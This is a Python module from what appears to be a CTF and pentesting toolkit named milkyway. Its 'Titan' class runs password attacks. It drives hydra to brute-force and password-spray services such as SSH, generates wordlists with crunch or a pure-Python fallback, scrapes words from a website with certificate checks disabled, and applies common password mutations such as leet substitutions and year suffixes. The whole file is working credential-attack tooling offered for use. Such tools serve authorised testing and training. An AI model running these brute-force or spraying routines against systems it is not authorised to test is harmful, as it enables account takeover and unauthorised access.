"""🪐 Titan — Password Attacks (pure Python, hydra optional)"""
from __future__ import annotations
import concurrent.futures, itertools, string, urllib.parse, urllib.request
from pathlib import Path
from typing import List, Optional
import click
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from milkyway.cli.planets.base import Planet
from milkyway.core.runner import RunResult, check_tool
console = Console(); C = "bright_yellow"

class Titan(Planet):
    NAME="titan"; SYMBOL="🪐"; DESCRIPTION="Password Attacks — brute-force, wordlist gen, mutation"
    TOOLS=["hydra","medusa","crunch","cewl"]

    def brute(self,target:str,service:str="ssh",username:Optional[str]=None,
              user_list:Optional[str]=None,wordlist:Optional[str]=None,
              port:Optional[int]=None,threads:int=4)->RunResult:
        console.print(Panel(f"[bold {C}]🪐 Brute Force[/bold {C}] {service}://{target}",border_style=C))
        if check_tool("hydra"):
            from milkyway.core.config import default_wordlist
            wl=wordlist or default_wordlist()
            args=["hydra","-t",str(threads)]
            if username: args+=["-l",username]
            elif user_list: args+=["-L",user_list]
            else: args+=["-l","admin"]
            args+=["-P",wl]
            if port: args+=["-s",str(port)]
            args+=[target,service]
            result=self.runner.run(args,streaming=True,on_line=lambda l:console.print(l))
            self._record("brute"," ".join(args),{"target":target,"service":service},result); return result
        console.print("  [yellow]hydra not found — install: apt install hydra[/yellow]")
        console.print("  [dim]Tip: pip install milkyway-ctf then: sudo apt install hydra[/dim]")
        result=RunResult("",1,"hydra not found","",0.0)
        self._record("brute",f"titan brute {target}",{"target":target},result); return result

    def spray(self,target:str,service:str="ssh",password:str="Password123",
              user_list:Optional[str]=None)->RunResult:
        console.print(Panel(f"[bold {C}]🪐 Password Spray[/bold {C}] {service}://{target}",border_style=C))
        if check_tool("hydra"):
            ul=user_list or "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
            args=["hydra","-L",ul,"-p",password,"-t","4",target,service]
            result=self.runner.run(args,streaming=True,on_line=lambda l:console.print(l))
            self._record("spray"," ".join(args),{"target":target},result); return result
        console.print("  [yellow]hydra not found — install: apt install hydra[/yellow]")
        return RunResult("",1,"hydra not found","",0.0)

    def wordlist(self,output:str="wordlist.txt",min_len:int=6,max_len:int=8,
                 charset:str="alnum",prefix:str="",suffix:str="")->RunResult:
        CHARSETS={"alpha":string.ascii_lowercase,"ALPHA":string.ascii_uppercase,
                  "alnum":string.ascii_lowercase+string.digits,
                  "ALNUM":string.ascii_letters+string.digits,
                  "digits":string.digits,"special":string.ascii_letters+string.digits+"!@#$%^&*",
                  "hex":"0123456789abcdef"}
        cs=CHARSETS.get(charset,charset)
        console.print(Panel(f"[bold {C}]🪐 Wordlist Gen[/bold {C}]",border_style=C))
        if check_tool("crunch"):
            args=["crunch",str(min_len),str(max_len),cs,"-o",output]
            result=self.runner.run(args,streaming=True,on_line=lambda l:console.print(l))
            self._record("wordlist"," ".join(args),{"output":output},result); return result
        count=0
        with open(output,"w") as f:
            for length in range(min_len,max_len+1):
                for combo in itertools.product(cs,repeat=length):
                    f.write(prefix+"".join(combo)+suffix+"\n"); count+=1
                    if count%100000==0: console.print(f"  [dim]Generated {count:,} words…[/dim]")
                    if count>=2000000: console.print("[yellow]Limit 2M reached[/yellow]"); break
                else: continue; break
        console.print(f"  [bold green]✓ {count:,} words → {output}[/bold green]")
        result=RunResult("titan wordlist",0,str(count),"",0.0)
        self._record("wordlist",f"titan wordlist -o {output}",{"output":output},result); return result

    def cewl(self,url:str,depth:int=2,min_word:int=5,output:str="cewl.txt")->RunResult:
        console.print(Panel(f"[bold {C}]🪐 CeWL Spider[/bold {C}] {url}",border_style=C))
        if check_tool("cewl"):
            args=["cewl",url,"-d",str(depth),"-m",str(min_word),"-w",output]
            result=self.runner.run(args,streaming=True,on_line=lambda l:console.print(l))
            self._record("cewl"," ".join(args),{"url":url},result); return result
        import re
        try:
            ctx=__import__("ssl").create_default_context(); ctx.check_hostname=False; ctx.verify_mode=0
            with urllib.request.urlopen(url,timeout=10,context=ctx) as resp:
                html=resp.read().decode("utf-8",errors="ignore")
            words=sorted(set(w.lower() for w in re.findall(r'\b[a-zA-Z]{'+str(min_word)+r',}\b',html)))
            Path(output).write_text("\n".join(words))
            console.print(f"  [bold green]✓ {len(words)} words → {output}[/bold green]")
            result=RunResult("titan cewl",0,str(len(words)),"",0.0)
        except Exception as e:
            console.print(f"  [red]{e}[/red]"); result=RunResult("",1,str(e),"",0.0)
        self._record("cewl",f"titan cewl {url}",{"url":url},result); return result

    def analyze(self,wordlist_path:str)->RunResult:
        path=Path(wordlist_path)
        if not path.exists():
            console.print(f"[red]Not found: {wordlist_path}[/red]"); return RunResult("",1,"","",0.0)
        console.print(Panel(f"[bold {C}]🪐 Wordlist Analyze[/bold {C}] {wordlist_path}",border_style=C))
        words=path.read_text(errors="ignore").splitlines()
        total=len(words); lengths={}
        char_stats={"digits_only":0,"alpha_only":0,"mixed":0,"special":0}
        for w in words:
            lengths[len(w)]=lengths.get(len(w),0)+1
            if w.isdigit(): char_stats["digits_only"]+=1
            elif w.isalpha(): char_stats["alpha_only"]+=1
            elif any(c in string.punctuation for c in w): char_stats["special"]+=1
            else: char_stats["mixed"]+=1
        table=Table(show_header=False,border_style="dim")
        table.add_column("Stat",style=C,width=18); table.add_column("Value")
        table.add_row("Total words",f"{total:,}")
        table.add_row("Avg length",f"{sum(len(w) for w in words)/max(total,1):.1f}")
        table.add_row("Min/Max",f"{min((len(w) for w in words),default=0)} / {max((len(w) for w in words),default=0)}")
        for k,v in char_stats.items(): table.add_row(k.replace("_"," ").title(),f"{v:,}")
        console.print(table)
        top5=sorted(lengths.items(),key=lambda x:-x[1])[:5]
        console.print("\n[bold]Top lengths:[/bold]")
        for length,count in top5:
            bar="█"*min(40,count*40//total)
            console.print(f"  {length:>3} chars  [cyan]{bar}[/cyan] {count:,}")
        result=RunResult("titan analyze",0,str(total),"",0.0)
        self._record("analyze",f"titan analyze {wordlist_path}",{"file":wordlist_path},result); return result

    def mutate(self,wordlist_path:str,output:str="mutated.txt",rules:str="common")->RunResult:
        path=Path(wordlist_path)
        if not path.exists():
            console.print(f"[red]Not found: {wordlist_path}[/red]"); return RunResult("",1,"","",0.0)
        console.print(Panel(f"[bold {C}]🪐 Mutate[/bold {C}] {wordlist_path}",border_style=C))
        words=path.read_text(errors="ignore").splitlines()
        mutated=set()
        for w in words:
            if not w: continue
            mutated|={w,w.capitalize(),w.upper()}
            for suf in ["1","123","!","2024","2025","@","#1","01"]:
                mutated|={w+suf,w.capitalize()+suf}
            leet=w.replace("a","@").replace("e","3").replace("i","1").replace("o","0").replace("s","$")
            mutated|={leet,leet.capitalize()}
        Path(output).write_text("\n".join(sorted(mutated)))
        console.print(f"  [bold green]✓ {len(mutated):,} mutations → {output}[/bold green]")
        console.print(f"  [dim]{len(words):,} → {len(mutated):,} ({len(mutated)/max(len(words),1):.1f}x)[/dim]")
        result=RunResult("titan mutate",0,str(len(mutated)),"",0.0)
        self._record("mutate",f"titan mutate {wordlist_path}",{"file":wordlist_path},result); return result

    def get_commands(self)->List[click.Command]: return []
